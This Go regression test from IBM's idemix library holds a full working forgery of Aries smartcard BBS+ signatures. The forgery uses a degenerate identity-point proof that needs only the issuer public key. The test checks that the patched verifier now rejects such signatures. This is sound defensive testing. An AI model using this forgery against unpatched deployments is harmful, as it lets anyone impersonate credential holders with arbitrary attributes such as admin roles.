/*
Copyright IBM Corp. All Rights Reserved.

SPDX-License-Identifier: Apache-2.0
*/

package aries_test

import (
	"encoding/binary"
	"testing"

	"github.com/IBM/idemix/bbs"
	"github.com/IBM/idemix/bccsp/schemes/aries"
	"github.com/IBM/idemix/bccsp/types"
	math "github.com/IBM/mathlib"
	"github.com/stretchr/testify/require"
	"google.golang.org/protobuf/proto"
)

// forgeSmartcardSignature builds an Aries smartcard signature using ONLY the
// issuer public key, exploiting a degenerate BBS+ proof with A' = Abar = O.
//
// In smartcard mode the VC2 verifier adds the caller-supplied nym as a free
// base, so the forger picks
//
//	nym = H0*t - g1 - sum_{revealed} H_i*m_i - sum_{hidden} H_j*m_j
//	d   = H0*k
//
// and proves VC1 (bases A'=O, H0; target Abar-d = -d) with witnesses (0, -k)
// and VC2 (bases d, H0, hidden H_j; target -(g1 + sum revealed + nym)) with
// witnesses (0, -t, m_j). The pairing check e(A', w) = e(Abar, g2) is
// trivially satisfied by A' = Abar = O.
//
// If withEidNym is set (ExpectSmartcard), the forger also produces a nym eid
// for an arbitrary enrollment ID together with its proof of knowledge, bound
// to the VC2 response of the hidden eid attribute.
func forgeSmartcardSignature(
	t *testing.T,
	c *math.Curve,
	ipk *aries.IssuerPublicKey,
	attrs []types.IdemixAttribute,
	hiddenValues map[int]*math.Zr, // attribute index -> value chosen by the forger
	eidIndex int,
	withEidNym bool,
	msg []byte,
) ([]byte, *math.G1) {
	t.Helper()

	pk := ipk.PKwG
	rng, err := c.Rand()
	require.NoError(t, err)

	id := c.NewG1() // identity
	H0 := pk.H0
	q := c.GroupOrder

	// sk sits at position 0, attribute i uses base H[i+1]
	nymT := c.NewRandomZr(rng)
	nym := H0.Mul(nymT)
	nym.Sub(c.GenG1)

	revealed := []int{}
	hiddenBases := []*math.G1{}
	hiddenWitnesses := []*math.Zr{}
	vc2EidIdx := -1
	for i, a := range attrs {
		var m *math.Zr
		switch a.Type {
		case types.IdemixBytesAttribute:
			m = bbs.FrFromOKM(a.Value.([]byte), c)
			revealed = append(revealed, i+1)
		case types.IdemixIntAttribute:
			m = c.NewZrFromInt(int64(a.Value.(int)))
			revealed = append(revealed, i+1)
		case types.IdemixHiddenAttribute:
			m = hiddenValues[i]
			require.NotNil(t, m)
			if i == eidIndex {
				vc2EidIdx = 2 + len(hiddenBases)
			}
			hiddenBases = append(hiddenBases, pk.H[i+1])
			hiddenWitnesses = append(hiddenWitnesses, m)
		}
		nym.Sub(pk.H[i+1].Mul(m))
	}

	k := c.NewRandomZr(rng)
	d := H0.Mul(k)

	// VC1: bases [A'=O, H0], witnesses (0, -k)
	r11, r12 := c.NewRandomZr(rng), c.NewRandomZr(rng)
	T1 := H0.Mul(r12)

	// VC2: bases [d, H0, hidden H_j...], witnesses (0, -t, m_j...)
	vc2Bases := append([]*math.G1{d, H0}, hiddenBases...)
	vc2Witnesses := append([]*math.Zr{c.NewZrFromInt(0), c.ModNeg(nymT, q)}, hiddenWitnesses...)
	vc2Blindings := make([]*math.Zr, len(vc2Bases))
	T2 := c.NewG1()
	for i := range vc2Bases {
		vc2Blindings[i] = c.NewRandomZr(rng)
		T2.Add(vc2Bases[i].Mul(vc2Blindings[i]))
	}

	// optional nym eid: bases [H0, H_eid], witnesses (rEid, eid)
	var nymEid, TEid *math.G1
	var rEid, rEidBlinding *math.Zr
	if withEidNym {
		require.GreaterOrEqual(t, vc2EidIdx, 0)
		rEid = c.NewRandomZr(rng)
		nymEid = H0.Mul2(rEid, pk.H[eidIndex+1], hiddenValues[eidIndex])
		rEidBlinding = c.NewRandomZr(rng)
		TEid = H0.Mul2(rEidBlinding, pk.H[eidIndex+1], vc2Blindings[vc2EidIdx])
	}

	// challenge, mirroring Signer.Verify
	var cb []byte
	if withEidNym {
		cb = []byte("signWithSmartcard")
	} else {
		cb = []byte("signWithSmartcardNoNyms")
	}
	cb = append(cb, id.Bytes()...) // aBar
	cb = append(cb, id.Bytes()...) // aPrime
	cb = append(cb, H0.Bytes()...)
	cb = append(cb, T1.Bytes()...)
	cb = append(cb, d.Bytes()...)
	cb = append(cb, H0.Bytes()...)
	for _, h := range hiddenBases {
		cb = append(cb, h.Bytes()...)
	}
	cb = append(cb, T2.Bytes()...)
	cb = append(cb, nym.Bytes()...)
	if withEidNym {
		cb = append(cb, nymEid.Bytes()...)
		cb = append(cb, TEid.Bytes()...)
	}
	cb = append(cb, bbs.ParseProofNonce(msg, c).ToBytes()...)
	ch := bbs.FrFromOKM(cb, c)
	nonce := c.NewRandomZr(rng)
	ch = bbs.FrFromOKM(append(ch.Bytes(), nonce.Bytes()...), c)

	resp := func(r, w *math.Zr) *math.Zr { return c.ModSub(r, c.ModMul(ch, w, q), q) }

	vc1 := bbs.NewProofG1(T1, []*math.Zr{resp(r11, c.NewZrFromInt(0)), resp(r12, c.ModNeg(k, q))})
	vc2Resp := make([]*math.Zr, len(vc2Bases))
	for i := range vc2Bases {
		vc2Resp[i] = resp(vc2Blindings[i], vc2Witnesses[i])
	}
	vc2 := bbs.NewProofG1(T2, vc2Resp)

	payload, err := bbs.NewPoKPayload(len(attrs)+1, revealed).ToBytes()
	require.NoError(t, err)
	main := append([]byte{}, payload...)
	main = append(main, id.Compressed()...)
	main = append(main, id.Compressed()...)
	main = append(main, d.Compressed()...)
	v1 := vc1.ToBytes()
	l := make([]byte, 4)
	binary.BigEndian.PutUint32(l, uint32(len(v1))) // #nosec G115 -- small test buffer
	main = append(main, l...)
	main = append(main, v1...)
	main = append(main, vc2.ToBytes()...)

	sig := &aries.Signature{
		MainSignature:      main,
		Nonce:              nonce.Bytes(),
		Nym:                nym.Bytes(),
		NonRevocationProof: &aries.NonRevocationProof{RevocationAlg: int32(types.AlgNoRevocation)},
	}
	if withEidNym {
		eidProof := bbs.NewProofG1(TEid, []*math.Zr{resp(rEidBlinding, rEid), vc2Resp[vc2EidIdx]})
		sig.NymEid = nymEid.Bytes()
		sig.NymEidProof = eidProof.ToBytes()
		sig.NymEidIdx = int32(vc2EidIdx) // #nosec G115 -- small index
	}

	b, err := proto.Marshal(sig)
	require.NoError(t, err)

	return b, nym
}

// TestSmartcardForgeryWithIdentityAPrimeRejected is a regression test for a
// universal forgery of Aries smartcard signatures: PoKOfSignatureProof.Verify
// did not reject A' = O, which allowed anybody holding only the issuer public
// key to produce signatures that verified under ExpectSmartcardNoNyms and
// ExpectSmartcard for arbitrary attributes and messages.
func TestSmartcardForgeryWithIdentityAPrimeRejected(t *testing.T) {
	for _, curveID := range []math.CurveID{
		math.BLS12_381_BBS,
		math.BLS12_381_BBS_GURVY,
		math.FP256BN_AMCL,
		math.FP256BN_AMCL_MIRACL,
		math.BN254,
	} {
		t.Run(math.CurveIDToString(curveID), func(t *testing.T) {
			c := math.Curves[curveID]
			issuer := &aries.Issuer{Curve: c}
			isk, err := issuer.NewKey([]string{"ou", "role", "eid", "rh"})
			require.NoError(t, err)
			ipk := isk.Public().(*aries.IssuerPublicKey) // the forger only uses ipk

			rng, err := c.Rand()
			require.NoError(t, err)
			verifier := &aries.Signer{Curve: c, Rng: rng}
			msg := []byte("transfer everything")

			t.Run("ExpectSmartcardNoNyms", func(t *testing.T) {
				attrs := []types.IdemixAttribute{
					{Type: types.IdemixBytesAttribute, Value: []byte("ADMIN-OU")},
					{Type: types.IdemixIntAttribute, Value: 1},
					{Type: types.IdemixBytesAttribute, Value: []byte("root")},
					{Type: types.IdemixBytesAttribute, Value: []byte("anything")},
				}

				sig, nym := forgeSmartcardSignature(t, c, ipk, attrs, nil, 2, false, msg)

				err := verifier.Verify(ipk, sig, msg, nym, attrs, 3, 2, 0, nil, 0, types.ExpectSmartcardNoNyms, nil)
				require.Error(t, err)
				require.Contains(t, err.Error(), "A' is the identity")
			})

			t.Run("ExpectSmartcard", func(t *testing.T) {
				rhIndex, eidIndex := 3, 2
				attrs := []types.IdemixAttribute{
					{Type: types.IdemixBytesAttribute, Value: []byte("ADMIN-OU")},
					{Type: types.IdemixIntAttribute, Value: 1},
					{Type: types.IdemixHiddenAttribute},
					{Type: types.IdemixHiddenAttribute},
				}
				eid := bbs.FrFromOKM([]byte("root"), c)
				hidden := map[int]*math.Zr{
					eidIndex: eid,
					rhIndex:  bbs.FrFromOKM([]byte("anything"), c),
				}

				sig, nym := forgeSmartcardSignature(t, c, ipk, attrs, hidden, eidIndex, true, msg)

				err := verifier.Verify(ipk, sig, msg, nym, attrs, rhIndex, eidIndex, 0, nil, 0, types.ExpectSmartcard, nil)
				require.Error(t, err)
				require.Contains(t, err.Error(), "A' is the identity")
			})
		})
	}
}
